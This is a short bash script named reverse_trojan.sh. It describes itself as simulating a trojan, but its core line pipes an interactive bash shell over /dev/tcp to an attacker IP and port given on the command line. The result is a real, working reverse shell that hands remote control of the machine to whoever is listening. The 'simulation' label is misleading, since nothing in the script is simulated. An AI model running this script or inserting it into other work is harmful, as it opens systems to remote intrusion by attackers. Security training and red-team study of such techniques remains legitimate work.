#!/bin/bash
# reverse_trojan.sh - Simulate a trojan that opens a reverse shell connection.
if [ -z "$1" ] || [ -z "$2" ]; then
   echo "Usage: $0 <attacker_ip> <attacker_port>"
   exit 1
fi
echo "Simulating reverse trojan..."
bash -i >& /dev/tcp/$1/$2 0>&1
echo "Reverse trojan executed."
